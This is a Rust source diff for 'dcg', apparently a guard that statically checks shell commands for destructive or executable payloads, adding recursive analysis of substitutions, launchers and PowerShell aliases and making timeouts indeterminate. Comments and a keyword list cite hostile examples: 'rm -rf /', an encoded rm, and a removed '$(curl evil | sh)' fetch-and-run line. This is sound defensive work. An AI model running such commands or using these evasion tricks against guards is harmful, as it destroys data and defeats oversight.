+            let powershell_bodies = match collect_powershell_substitution_bodies(
+                substitution_source.as_ref(),
+            ) {
+                Ok(bodies) => bodies,
+                Err(()) => {
+                    return Some(EvaluationResult::denied_by_legacy(
+                        "PowerShell substitution contains comment syntax that dcg cannot statically disambiguate",
+                    ));
+                }
+            };
+            let mut substitutions: Vec<_> = posix_substitutions
+                .into_iter()
+                .map(|substitution| {
+                    (
+                        substitution.body,
+                        ShellDialect::Posix,
+                        Some(substitution.start),
+                        false,
+                    )
+                })
+                .collect();
+            substitutions.extend(
+                powershell_bodies
+                    .into_iter()
+                    .map(|body| (body, ShellDialect::PowerShell, None, false)),
+            );
+            substitutions
+        }
+        ShellDialect::Cmd => Vec::new(),
+    };
+    if substitutions.is_empty() {
+        return None;
+    }
+    if nested_command_depth >= MAX_EMBEDDED_SHELL_DEPTH {
+        return Some(EvaluationResult::denied_by_legacy(
+            "command-substitution nesting exceeds dcg's static-analysis limit",
+        ));
+    }
+    if substitutions.len() > MAX_INDIRECT_INPUT_FLOWS {
+        return Some(EvaluationResult::denied_by_legacy(
+            "command contains too many substitutions for bounded static analysis",
+        ));
+    }
+    let total_bytes = substitutions
+        .iter()
+        .try_fold(0usize, |total, (body, _, _, _)| {
+            total.checked_add(body.len())
+        });
+    if total_bytes.is_none_or(|bytes| bytes > MAX_WINDOWS_LAUNCHER_PAYLOAD_BYTES) {
+        return Some(EvaluationResult::denied_by_legacy(
+            "command-substitution payload exceeds dcg's static-analysis limit",
+        ));
+    }
+
+    for (body, candidate_dialect, source_start, verbatim_value) in substitutions {
+        if candidate_dialect == ShellDialect::PowerShell
+            && is_static_powershell_string_expression(&body)
+        {
+            continue;
+        }
+        let substitution_automated_stdin = inherited_automated_stdin
+            || source_start.is_some_and(|start| {
+                source_position_receives_automated_stdin(command, start, shell_dialect)
+            });
+        let mut result = evaluate_command_with_pack_order_deadline_at_path_inner(
+            &body,
+            enabled_keywords,
+            ordered_packs,
+            keyword_index,
+            compiled_overrides,
+            allowlists,
+            heredoc_settings,
+            allow_once_audit,
+            project_path,
+            deadline,
+            candidate_dialect,
+            nested_command_depth + 1,
+            substitution_automated_stdin,
+        );
+        if result.skipped_due_to_budget {
+            return Some(EvaluationResult::denied_by_legacy(
+                "command-substitution analysis exceeded dcg's deadline",
+            ));
+        }
+        if result.is_denied() {
+            if let Some(info) = result.pattern_info.as_mut() {
+                let context = if verbatim_value {
+                    "Nested PowerShell verbatim here-string contains command-shaped text without proven inert data flow"
+                } else {
+                    "Command substitution executes"
+                };
+                info.reason = format!("{context}: {}", info.reason);
+                info.matched_span = None;
+                info.matched_text_preview = None;
+            }
+            return Some(result);
+        }
+        if first_allowlist_hit.is_none() {
+            if let Some(allowlist_override) = result.allowlist_override.take() {
+                let mut matched = allowlist_override.matched;
+                matched.matched_span = None;
+                matched.matched_text_preview = None;
+                *first_allowlist_hit =
+                    Some((matched, allowlist_override.layer, allowlist_override.reason));
+            }
+        }
+    }
+    None
+}
+
+/// Mask outer-shell data bytes after every POSIX command substitution body has
+/// already been recursively evaluated.
+///
+/// The general sanitizer intentionally keeps `$()` and backticks visible
+/// because their bodies execute. Once the recursive pass above has checked the
+/// bodies, however, leaving them visible can reinterpret producer output as
+/// syntax in the *outer* command. To avoid that double counting, substitute a
+/// same-length inert word in a shadow command, ask the normal role-aware
+/// sanitizer which bytes are data, and transfer only those masks back to the
+/// real matching view. Executable-position substitutions and piped producers
+/// remain visible because the sanitizer never classifies those positions as
+/// inert data.
+fn mask_checked_posix_substitutions<'a>(
+    sanitized: &'a str,
+    original: &str,
+    shell_dialect: ShellDialect,
+) -> Cow<'a, str> {
+    if !matches!(shell_dialect, ShellDialect::Posix | ShellDialect::Unknown)
+        || (!original.contains("$(") && !original.contains('`'))
+        || sanitized.len() != original.len()
+    {
+        return Cow::Borrowed(sanitized);
+    }
+
+    let substitution_source = crate::heredoc::mask_non_expanding_data_heredocs(original);
+    let Ok(substitutions) =
+        crate::heredoc::extract_posix_command_substitutions(substitution_source.as_ref())
+    else {
+        return Cow::Borrowed(sanitized);
+    };
+    if substitutions.is_empty() {
+        return Cow::Borrowed(sanitized);
+    }
+
+    let mut shadow = original.as_bytes().to_vec();
+    for substitution in &substitutions {
+        if substitution.start >= substitution.end
+            || substitution.end > shadow.len()
+            || !original.is_char_boundary(substitution.start)
+            || !original.is_char_boundary(substitution.end)
+        {
+            return Cow::Borrowed(sanitized);
+        }
+        shadow[substitution.start..substitution.end].fill(b'x');
+    }
+    let Ok(shadow) = String::from_utf8(shadow) else {
+        return Cow::Borrowed(sanitized);
+    };
+    let shadow_sanitized = sanitize_for_pattern_matching(&shadow);
+    if shadow_sanitized.len() != sanitized.len() {
+        return Cow::Borrowed(sanitized);
+    }
+
+    let mut output = sanitized.as_bytes().to_vec();
+    let mut changed = false;
+    for (index, shadow_byte) in shadow_sanitized.bytes().enumerate() {
+        if shadow_byte == b' ' && output[index] != b' ' {
+            output[index] = b' ';
+            changed = true;
+        }
+    }
+    if !changed {
+        return Cow::Borrowed(sanitized);
+    }
+    Cow::Owned(
+        String::from_utf8(output)
+            .expect("role-aware masks replace complete UTF-8 token ranges with ASCII spaces"),
+    )
+}
+
+fn active_posix_variable_references(
+    command: &str,
+    name: &str,
+) -> Option<Vec<std::ops::Range<usize>>> {
+    let bytes = command.as_bytes();
+    let mut references = Vec::new();
+    let mut index = 0usize;
+    let mut in_single = false;
+    let mut in_double = false;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'\\' if !in_single && index + 1 < bytes.len() => index += 2,
+            b'\'' if !in_double => {
+                in_single = !in_single;
+                index += 1;
+            }
+            b'"' if !in_single => {
+                in_double = !in_double;
+                index += 1;
+            }
+            b'$' if !in_single && bytes.get(index + 1) == Some(&b'{') => {
+                let close = command.get(index + 2..)?.find('}')? + index + 2;
+                let expression = command.get(index + 2..close)?;
+                if expression == name {
+                    references.push(index..close + 1);
+                } else if expression.contains(name) {
+                    // Modifiers, indirection, slicing, and replacement forms
+                    // have shell-specific data flow. Do not grant the narrow
+                    // inert-assignment allowance when any are present.
+                    return None;
+                }
+                index = close + 1;
+            }
+            b'$' if !in_single
+                && bytes
+                    .get(index + 1)
+                    .is_some_and(|byte| byte.is_ascii_alphabetic() || *byte == b'_') =>
+            {
+                let mut end = index + 2;
+                while bytes
+                    .get(end)
+                    .is_some_and(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
+                {
+                    end += 1;
+                }
+                if command.get(index + 1..end)? == name {
+                    references.push(index..end);
+                }
+                index = end;
+            }
+            _ => index += 1,
+        }
+    }
+    (!in_single && !in_double).then_some(references)
+}
+
+/// Mask a static assignment only when the complete compound command proves
+/// that its value is consumed exclusively in a sanitizer-recognized data slot.
+///
+/// This deliberately accepts only one assignment-only segment followed by one
+/// consumer segment. More complex shell state, indirect expansion, pipelines,
+/// or executable-position use remains on the conservative matching path.
+fn mask_posix_assignments_consumed_as_data<'a>(
+    sanitized: &'a str,
+    original: &str,
+    shell_dialect: ShellDialect,
+) -> Cow<'a, str> {
+    if !matches!(shell_dialect, ShellDialect::Posix | ShellDialect::Unknown)
+        || sanitized.len() != original.len()
+    {
+        return Cow::Borrowed(sanitized);
+    }
+    let ranges = command_segment_ranges_in_dialect(original, ShellDialect::Posix);
+    let [
+        (assignment_start, assignment_end),
+        (consumer_start, consumer_end),
+    ] = ranges.as_slice()
+    else {
+        return Cow::Borrowed(sanitized);
+    };
+    let assignment_segment = &original[*assignment_start..*assignment_end];
+    let tokens = tokenize_for_shell_dialect(assignment_segment, ShellDialect::Posix);
+    let words: Vec<_> = tokens
+        .iter()
+        .filter(|token| token.kind == NormalizeTokenKind::Word)
+        .collect();
+    if words.is_empty()
+        || tokens
+            .iter()
+            .any(|token| token.kind == NormalizeTokenKind::Separator)
+    {
+        return Cow::Borrowed(sanitized);
+    }
+
+    let consumer = &original[*consumer_start..*consumer_end];
+    let mut assignment_masks = Vec::new();
+    let mut reference_ranges = Vec::new();
+    for token in words {
+        let Some(raw) = token.text(assignment_segment) else {
+            return Cow::Borrowed(sanitized);
+        };
+        let Some(equals) = raw.find('=') else {
+            return Cow::Borrowed(sanitized);
+        };
+        let name = &raw[..equals];
+        if name.is_empty()
+            || !name.bytes().enumerate().all(|(index, byte)| {
+                byte.is_ascii_alphabetic() || byte == b'_' || index > 0 && byte.is_ascii_digit()
+            })
+            || contains_dynamic_shell_output(&raw[equals + 1..])
+            || shell_word_value(raw, ShellDialect::Posix).and_then(|decoded| {
+                decoded
+                    .split_once('=')
+                    .map(|(decoded_name, _)| decoded_name == name)
+            }) != Some(true)
+        {
+            return Cow::Borrowed(sanitized);
+        }
+        let Some(references) = active_posix_variable_references(consumer, name) else {
+            return Cow::Borrowed(sanitized);
+        };
+        if references.is_empty() {
+            return Cow::Borrowed(sanitized);
+        }
+        reference_ranges.extend(
+            references
+                .into_iter()
+                .map(|range| range.start + *consumer_start..range.end + *consumer_start),
+        );
+        assignment_masks.push(
+            token.byte_range.start + *assignment_start..token.byte_range.end + *assignment_start,
+        );
+    }
+
+    let mut shadow = original.as_bytes().to_vec();
+    for range in &reference_ranges {
+        shadow[range.clone()].fill(b'x');
+    }
+    let Ok(shadow) = String::from_utf8(shadow) else {
+        return Cow::Borrowed(sanitized);
+    };
+    let shadow_sanitized = sanitize_for_pattern_matching(&shadow);
+    if shadow_sanitized.len() != original.len()
+        || reference_ranges.iter().any(|range| {
+            !shadow_sanitized.as_bytes()[range.clone()]
+                .iter()
+                .all(|byte| *byte == b' ')
+        })
+    {
+        return Cow::Borrowed(sanitized);
+    }
+
+    let mut output = sanitized.as_bytes().to_vec();
+    for range in assignment_masks {
+        output[range].fill(b' ');
+    }
+    Cow::Owned(
+        String::from_utf8(output)
+            .expect("assignment masks replace complete UTF-8 token ranges with ASCII spaces"),
+    )
 }
 
 fn resolve_project_path(
@@ -1436,10 +5718,87 @@ fn allow_once_match_force_config(
     }
 }
 
+/// Return whether evaluation may recurse into an executable payload before the
+/// ordinary full-command allowlist phase.
+///
+/// Keep this predicate deliberately broad. It is only a performance guard for
+/// the allow-once store lookup; a false positive costs one bounded lookup,
+/// whereas a false negative would make an explicitly authorized outer command
+/// impossible to run because its nested payload is denied first.
+fn may_evaluate_nested_payload_before_allowlists(command: &str) -> bool {
+    if check_triggers(command) == TriggerResult::Triggered
+        || command.contains("$(")
+        || command.contains('`')
+        || command.contains("<<")
+        || command.contains('^')
+        || command.contains('\\')
+    {
+        return true;
+    }
+
+    if find_powershell_scriptblock_create(command, 0).is_some() {
+        return true;
+    }
+
+    let lower = command.to_ascii_lowercase();
+    [
+        "powershell",
+        "pwsh",
+        "cmd.exe",
+        "cmd /c",
+        "cmd /k",
+        "eval ",
+        "iex ",
+        "invoke-expression",
+    ]
+    .iter()
+    .any(|needle| lower.contains(needle))
+}
+
+fn outer_command_allowlisted_before_nested_evaluation(
+    command: &str,
+    allowlists: &LayeredAllowlist,
+    project_path: Option<&Path>,
+) -> bool {
+    if allowlists.layers.is_empty() {
+        return false;
+    }
+
+    // Match exactly the same sanitized/normalized representation used by the
+    // ordinary allowlist phase below. Only whole-command selectors are checked
+    // here: rule selectors must never authorize an unrelated nested rule.
+    let matches_full_command = |normalized: &str| {
+        allowlists
+            .match_exact_command_at_path(normalized, project_path)
+            .is_some()
+            || allowlists
+                .match_command_prefix_at_path(normalized, project_path)
+                .is_some()
+            || allowlists
+                .match_pattern_at_path(normalized, project_path)
+                .is_some()
+    };
+
+    // First honor the literal outer envelope after ordinary command-word
+    // normalization. Sanitization can intentionally remove inert data spans,
+    // but an exact outer-command grant must still match what the user granted.
+    let raw_normalized = crate::normalize::normalize_command(command);
+    if matches_full_command(raw_normalized.as_ref()) {
+        return true;
+    }
+
+    // Retain the established sanitized matching representation as a fallback
+    // for existing allowlist entries created by earlier releases.
+    let sanitized = sanitize_for_pattern_matching(command);
+    let normalized = crate::normalize::normalize_command(sanitized.as_ref());
+    matches_full_command(normalized.as_ref())
+}
+
 /// Evaluate a command against all patterns and packs using a deadline.
 ///
-/// When `deadline` is provided and exceeded, evaluation fails open and returns
-/// `skipped_due_to_budget=true` so hook mode can allow the command safely.
+/// When `deadline` is provided and exceeded, evaluation returns an explicit
+/// indeterminate result with `skipped_due_to_budget=true`. Callers must ask for
+/// review or block; elapsed time is never evidence that a command is safe.
 #[must_use]
 pub fn evaluate_command_with_deadline(
     command: &str,
@@ -1528,10 +5887,40 @@ pub fn evaluate_command_with_pack_order_at_path(
     )
 }
 
-/// Evaluate a command with deadline support for fail-open behavior.
+/// Evaluate a command with a caller-proven shell dialect and project path.
+#[must_use]
+#[allow(clippy::too_many_arguments)]
+pub fn evaluate_command_with_pack_order_at_path_in_dialect(
+    command: &str,
+    enabled_keywords: &[&str],
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    compiled_overrides: &crate::config::CompiledOverrides,
+    allowlists: &LayeredAllowlist,
+    heredoc_settings: &crate::config::HeredocSettings,
+    project_path: Option<&Path>,
+    shell_dialect: crate::normalize::ShellDialect,
+) -> EvaluationResult {
+    evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+        command,
+        enabled_keywords,
+        ordered_packs,
+        keyword_index,
+        compiled_overrides,
+        allowlists,
+        heredoc_settings,
+        None,
+        project_path,
+        None,
+        shell_dialect,
+    )
+}
+
+/// Evaluate a command with deadline support and conservative indeterminate results.
 ///
 /// This is the hook-mode entry point that supports budget enforcement.
-/// If the deadline is exceeded at check points, returns `allowed_due_to_budget()`.
+/// If the deadline is exceeded at check points, returns
+/// `indeterminate_due_to_budget()`.
 ///
 /// # Arguments
 ///
@@ -1541,7 +5930,7 @@ pub fn evaluate_command_with_pack_order_at_path(
 /// * `compiled_overrides` - Precompiled config overrides
 /// * `allowlists` - Layered allowlist for overrides
 /// * `heredoc_settings` - Settings for heredoc analysis
-/// * `deadline` - Optional deadline for fail-open behavior
+/// * `deadline` - Optional deadline for bounded evaluation
 ///
 /// # Returns
 ///
@@ -1589,6 +5978,42 @@ pub fn evaluate_command_with_pack_order_deadline_at_path(
     project_path: Option<&Path>,
     deadline: Option<&Deadline>,
 ) -> EvaluationResult {
+    evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+        command,
+        enabled_keywords,
+        ordered_packs,
+        keyword_index,
+        compiled_overrides,
+        allowlists,
+        heredoc_settings,
+        allow_once_audit,
+        project_path,
+        deadline,
+        crate::normalize::ShellDialect::Unknown,
+    )
+}
+
+/// Evaluate a command while preserving a caller-proven shell dialect.
+///
+/// Existing entry points intentionally use [`crate::normalize::ShellDialect::Unknown`]
+/// for compatibility. Hook and scanner adapters should call this variant only
+/// when their wire/file context identifies the shell unambiguously.
+#[must_use]
+#[allow(clippy::too_many_arguments)]
+#[allow(clippy::too_many_lines)]
+pub fn evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+    command: &str,
+    enabled_keywords: &[&str],
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    compiled_overrides: &crate::config::CompiledOverrides,
+    allowlists: &LayeredAllowlist,
+    heredoc_settings: &crate::config::HeredocSettings,
+    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
+    project_path: Option<&Path>,
+    deadline: Option<&Deadline>,
+    shell_dialect: crate::normalize::ShellDialect,
+) -> EvaluationResult {
     evaluate_command_with_pack_order_deadline_at_path_inner(
         command,
         enabled_keywords,
@@ -1600,7 +6025,9 @@ pub fn evaluate_command_with_pack_order_deadline_at_path(
         allow_once_audit,
         project_path,
         deadline,
+        shell_dialect,
         0,
+        false,
     )
 }
 
@@ -1617,16 +6044,18 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
     allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
     project_path: Option<&Path>,
     deadline: Option<&Deadline>,
+    shell_dialect: crate::normalize::ShellDialect,
     nested_command_depth: usize,
+    inherited_automated_stdin: bool,
 ) -> EvaluationResult {
     if nested_command_depth > MAX_EMBEDDED_SHELL_DEPTH {
         return EvaluationResult::denied_by_legacy(
             "Embedded executable command nesting exceeds dcg's static-analysis limit",
         );
     }
-    // Check deadline at entry - if already exceeded, fail-open immediately.
+    // An expired deadline is never proof that the command is safe.
     if deadline_exceeded(deadline) {
-        return EvaluationResult::allowed_due_to_budget();
+        return EvaluationResult::indeterminate_due_to_budget();
     }
 
     // Empty commands are allowed (no-op)
@@ -1672,8 +6101,21 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
         return EvaluationResult::allowed();
     }
 
+    // A standalone PowerShell string or script-block literal is an expression
+    // value, not an invocation. This distinction is especially important for
+    // `pwsh -Command` launched by POSIX/Cmd: `{ ... }` is parsed and printed as
+    // a ScriptBlock object unless an outer PowerShell process supplied an
+    // actual unquoted script-block argument (that provenance is handled by the
+    // launcher parser before it builds the nested envelope).
+    if shell_dialect == ShellDialect::PowerShell
+        && (is_static_powershell_string_expression(command)
+            || is_static_powershell_script_block_expression(command))
+    {
+        return EvaluationResult::allowed();
+    }
+
     if deadline_exceeded(deadline) {
-        return EvaluationResult::allowed_due_to_budget();
+        return EvaluationResult::indeterminate_due_to_budget();
     }
 
     // Step 3: Heredoc / inline-script detection (Tier 1/2/3, fail-open).
@@ -1683,9 +6125,147 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
     let project_path = resolve_project_path(heredoc_settings, project_path);
     let project_path = project_path.as_deref();
 
+    // Launcher and substitution evaluation recurses before the ordinary
+    // full-command allowlist phase. Honor an authorization for the exact outer
+    // command first, after explicit block overrides have already won above.
+    // This does not consult rule selectors, so authorizing one outer envelope
+    // cannot accidentally authorize arbitrary nested commands.
+    let checked_allow_once_before_nested = may_evaluate_nested_payload_before_allowlists(command);
+    if checked_allow_once_before_nested
+        && (allow_once_match(command, allow_once_audit).is_some()
+            || outer_command_allowlisted_before_nested_evaluation(
+                command,
+                allowlists,
+                project_path,
+            ))
+    {
+        return EvaluationResult::allowed();
+    }
+
+    // PowerShell aliases created earlier in the same submitted script affect
+    // command resolution in later statements. Expand only those visible,
+    // statically bounded definitions and recursively evaluate the resulting
+    // invocation before sink detection and keyword quick rejection. This
+    // closes both protected-cmdlet and executable-text sink aliases while
+    // preserving ordinary alias definitions as inert state until invoked.
+    if shell_dialect == ShellDialect::PowerShell {
+        if let Some(blocked) = evaluate_visible_powershell_alias_invocations(
+            command,
+            nested_command_depth,
+            enabled_keywords,
+            ordered_packs,
+            keyword_index,
+            compiled_overrides,
+            allowlists,
+            heredoc_settings,
+            allow_once_audit,
+            project_path,
+            deadline,
+            inherited_automated_stdin,
+        ) {
+            return blocked;
+        }
+        if let Some(blocked) = evaluate_visible_powershell_scriptblock_invocations(
+            command,
+            nested_command_depth,
+            enabled_keywords,
+            ordered_packs,
+            keyword_index,
+            compiled_overrides,
+            allowlists,
+            heredoc_settings,
+            allow_once_audit,
+            project_path,
+            deadline,
+            inherited_automated_stdin,
+        ) {
+            return blocked;
+        }
+    }
+
+    // Parse executable shell launchers as recursive, dialect-carrying command
+    // envelopes before heredoc regex extraction and keyword quick rejection.
+    // Regex remains a useful compatibility layer, but it cannot model shell
+    // escape layers, quoted host switches, or cmd's raw `/c` tail reliably.
+    if let Some(blocked) = evaluate_windows_launcher_envelopes(
+        command,
+        shell_dialect,
+        nested_command_depth,
+        enabled_keywords,
+        ordered_packs,
+        keyword_index,
+        compiled_overrides,
+        allowlists,
+        heredoc_settings,
+        allow_once_audit,
+        project_path,
+        deadline,
+        &mut heredoc_allowlist_hit,
+        inherited_automated_stdin,
+    ) {
+        return blocked;
+    }
+
+    if let Some(blocked) = evaluate_obfuscated_posix_inline_launchers(
+        command,
+        shell_dialect,
+        nested_command_depth,
+        enabled_keywords,
+        ordered_packs,
+        keyword_index,
+        compiled_overrides,
+        allowlists,
+        heredoc_settings,
+        allow_once_audit,
+        project_path,
+        deadline,
+        &mut heredoc_allowlist_hit,
+        inherited_automated_stdin,
+    ) {
+        return blocked;
+    }
+
+    if let Some(blocked) = evaluate_executable_text_sinks(
+        command,
+        shell_dialect,
+        nested_command_depth,
+        enabled_keywords,
+        ordered_packs,
+        keyword_index,
+        compiled_overrides,
+        allowlists,
+        heredoc_settings,
+        allow_once_audit,
+        project_path,
+        deadline,
+        &mut heredoc_allowlist_hit,
+        inherited_automated_stdin,
+    ) {
+        return blocked;
+    }
+
+    if let Some(blocked) = evaluate_command_substitutions(
+        command,
+        shell_dialect,
+        nested_command_depth,
+        enabled_keywords,
+        ordered_packs,
+        keyword_index,
+        compiled_overrides,
+        allowlists,
+        heredoc_settings,
+        allow_once_audit,
+        project_path,
+        deadline,
+        &mut heredoc_allowlist_hit,
+        inherited_automated_stdin,
+    ) {
+        return blocked;
+    }
+
     if heredoc_settings.enabled {
         if remaining_below(deadline, &crate::perf::HEREDOC_TRIGGER) {
-            return EvaluationResult::allowed_due_to_budget();
+            return EvaluationResult::indeterminate_due_to_budget();
         }
 
         if check_triggers(command) == TriggerResult::Triggered {
@@ -1709,6 +6289,9 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
                     keyword_index,
                     compiled_overrides,
                     allow_once_audit,
+                    shell_dialect,
+                    nested_command_depth,
+                    inherited_automated_stdin,
                 };
                 if let Some(blocked) =
                     evaluate_heredoc(command, context, &mut heredoc_allowlist_hit)
@@ -1720,7 +6303,7 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
     }
 
     if deadline_exceeded(deadline) {
-        return EvaluationResult::allowed_due_to_budget();
+        return EvaluationResult::indeterminate_due_to_budget();
     }
 
     // GNU sed can execute shell commands through the `e` command and the
@@ -1729,6 +6312,36 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
     // Extract the executable payload now so the quick-reject paths below do
     // not discard it before semantic evaluation.
     let sed_shell_sources = collect_sed_shell_sources(command, project_path);
+    let force_core_git = dialect_may_hide_core_git(command, shell_dialect, ordered_packs);
+    let force_core_filesystem = ordered_packs
+        .iter()
+        .any(|pack_id| pack_id == "core.filesystem")
+        && crate::packs::core::filesystem::filesystem_semantic_scan_required(
+            command,
+            shell_dialect,
+        );
+    let force_cloudflare_workers = ordered_packs
+        .iter()
+        .any(|pack_id| pack_id == "cdn.cloudflare_workers")
+        && crate::packs::cdn::cloudflare_workers::cloudflare_workers_semantic_scan_required(
+            command,
+            shell_dialect,
+        );
+    let force_snowflake = ordered_packs
+        .iter()
+        .any(|pack_id| pack_id == "database.snowflake")
+        && crate::packs::database::snowflake::snowflake_semantic_scan_required(
+            command,
+            shell_dialect,
+        );
+    let force_literal_database_packs = literal_substitution_database_packs(command, shell_dialect);
+    let force_windows_filesystem = ordered_packs
+        .iter()
+        .any(|pack_id| pack_id == "windows.filesystem")
+        && crate::packs::windows::filesystem::windows_filesystem_semantic_scan_required(
+            command,
+            shell_dialect,
+        );
 
     // Step 4: Quick rejection - if no relevant keywords, allow immediately.
     //
@@ -1740,21 +6353,38 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
         if sed_shell_sources.is_empty()
             && !index.has_any_keyword(command)
             && !contains_shell_word_obfuscation(command)
+            && !force_core_git
+            && !force_core_filesystem
+            && !force_cloudflare_workers
+            && !force_snowflake
+            && force_literal_database_packs.is_empty()
+            && !force_windows_filesystem
         {
             if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
                 return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
             }
-            return EvaluationResult::allowed();
+            return EvaluationResult::allowed_by_quick_reject();
         }
-    } else if sed_shell_sources.is_empty() && pack_aware_quick_reject(command, enabled_keywords) {
+    } else if sed_shell_sources.is_empty()
+        && !force_core_git
+        && !force_core_filesystem
+        && !force_cloudflare_workers
+        && !force_snowflake
+        && force_literal_database_packs.is_empty()
+        && !force_windows_filesystem
+        && pack_aware_quick_reject(
+            crate::normalize::normalize_command_in_dialect(command, shell_dialect).as_ref(),
+            enabled_keywords,
+        )
+    {
         if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
             return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
         }
-        return EvaluationResult::allowed();
+        return EvaluationResult::allowed_by_quick_reject();
     }
 
     if deadline_exceeded(deadline) {
-        return EvaluationResult::allowed_due_to_budget();
+        return EvaluationResult::indeterminate_due_to_budget();
     }
 
     // Step 5: False-positive immunity - strip known-safe string arguments (commit messages, search
@@ -1765,13 +6395,47 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
     // pack_aware_quick_reject_with_normalized returns both the quick-reject decision
     // and the normalized command, avoiding duplicate normalization.
     let sanitized = precomputed_sanitized.unwrap_or_else(|| sanitize_for_pattern_matching(command));
-    let command_for_match = sanitized.as_ref();
+    let checked_posix_substitutions =
+        mask_checked_posix_substitutions(sanitized.as_ref(), command, shell_dialect);
+    let inert_posix_assignments = mask_posix_assignments_consumed_as_data(
+        checked_posix_substitutions.as_ref(),
+        command,
+        shell_dialect,
+    );
+    // Preserve PowerShell `$()` expressions in the ordinary pack view. Even a
+    // static string result can become executable through the call operator,
+    // dot-sourcing, or another execution-capable consumer; globally masking it
+    // would create a command-reconstruction bypass.
+    let powershell_literal_sources = restore_powershell_here_string_substitution_text(
+        inert_posix_assignments.as_ref(),
+        command,
+        shell_dialect,
+    );
+    let inert_scriptblock_mask = mask_inert_powershell_scriptblock_sources(
+        powershell_literal_sources.as_ref(),
+        command,
+        shell_dialect,
+    );
+    let command_for_match = inert_scriptblock_mask.as_ref();
+
+    // Decode only caller-proven shell syntax at executable positions before
+    // keyword gating. In Bash, `$'\x72\x6d'` is the executable `rm`; leaving
+    // that syntax opaque would let both quick rejection and legacy pack
+    // patterns miss the command while still preserving ANSI-C argument data.
+    let dialect_normalized =
+        crate::normalize::normalize_command_in_dialect(command_for_match, shell_dialect);
 
     // Use the optimized version that returns both decision and normalized form.
     let (quick_reject, normalized) =
-        pack_aware_quick_reject_with_normalized(command_for_match, enabled_keywords);
+        pack_aware_quick_reject_with_normalized(dialect_normalized.as_ref(), enabled_keywords);
     if sed_shell_sources.is_empty()
         && quick_reject
+        && !force_core_git
+        && !force_core_filesystem
+        && !force_cloudflare_workers
+        && !force_snowflake
+        && force_literal_database_packs.is_empty()
+        && !force_windows_filesystem
         && !should_check_original_control_plane_payload_for_any_pack(
             command_for_match,
             command,
@@ -1781,18 +6445,18 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
         if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
             return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
         }
-        return EvaluationResult::allowed();
+        return EvaluationResult::allowed_by_quick_reject();
     }
 
     if deadline_exceeded(deadline) {
-        return EvaluationResult::allowed_due_to_budget();
+        return EvaluationResult::indeterminate_due_to_budget();
     }
 
-    // Deferred allow-once check: moved here from before keyword quick-reject.
-    // Allow-once entries only exist for previously blocked commands, which must
-    // have matched keywords — so deferring past quick-reject is safe and avoids
-    // ~65µs of filesystem I/O on every unrelated command.
-    if allow_once_match(command, allow_once_audit).is_some() {
+    // Deferred allow-once check for commands without nested executable syntax.
+    // Nested envelopes were checked before recursion above; ordinary commands
+    // stay here, past quick rejection, to avoid ~65µs of filesystem I/O on
+    // every unrelated hook invocation.
+    if !checked_allow_once_before_nested && allow_once_match(command, allow_once_audit).is_some() {
         return EvaluationResult::allowed();
     }
 
@@ -1851,31 +6515,9 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
         deadline,
         &mut heredoc_allowlist_hit,
         nested_command_depth,
+        inherited_automated_stdin,
     ) {
         return result;
-    // Built-in inspection-wrapper exemption (dcg#132).
-    //
-    // A small, hard-coded set of "inspection wrapper" prefixes
-    // (e.g. `ee preflight check --cmd`) consume the trailing destructive
-    // command as data rather than executing it. We must let them through
-    // before pack evaluation, or `dcg` will substring-match the destructive
-    // verb inside the analyzed argument and block the wrapper itself —
-    // exactly the false positive that filed dcg#132. Each prefix is
-    // evaluated by `command_prefix_safely_matches`, which enforces the
-    // same token-boundary + no-shell-chain-metacharacter guard used by
-    // user `command_prefix` allowlists. So a tail like
-    // `--cmd "rm -rf /"` allows through, but
-    // `--cmd "rm -rf /" ; reboot`, `--cmd "$(curl evil | sh)"`, etc.
-    // refuse the exemption and fall through to normal pack evaluation.
-    //
-    // We check both the raw command and the normalized form: the raw form
-    // is the agent-typed string we actually want to recognize; the
-    // normalized form is the belt-and-suspenders fallback if a future
-    // wrapper sneaks in via a path-stripped binary name.
-    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
-        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
-    {
-        return EvaluationResult::allowed();
     }
 
     // Step 7: Mask heredoc content for non-executing targets (cat, tee, etc.)
@@ -1889,6 +6531,7 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
         compiled_overrides,
         heredoc_settings,
         allow_once_audit,
+        inherited_automated_stdin,
     };
     let result = evaluate_packs_with_allowlists_at_depth(
         command_for_packs,
@@ -1900,8 +6543,10 @@ fn evaluate_command_with_pack_order_deadline_at_path_inner(
         keyword_index,
         deadline,
         project_path,
+        shell_dialect,
         nested_command_depth,
         Some(&nested_context),
+        inherited_automated_stdin,
     );
     if result.allowlist_override.is_none() {
         if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
@@ -1919,11 +6564,122 @@ const MAX_DATABASE_INCLUDE_DEPTH: usize = 8;
 const INDIRECT_INPUT_RULE: &str = "stdin-unverified";
 const SED_EXEC_UNVERIFIED_RULE: &str = "sed-exec-unverified";
 
+fn protected_database_pack_for_executable(executable: &str) -> Option<&'static str> {
+    match executable {
+        "redis-cli" | "valkey-cli" | "keydb-cli" => Some("database.redis"),
+        "psql" => Some("database.postgresql"),
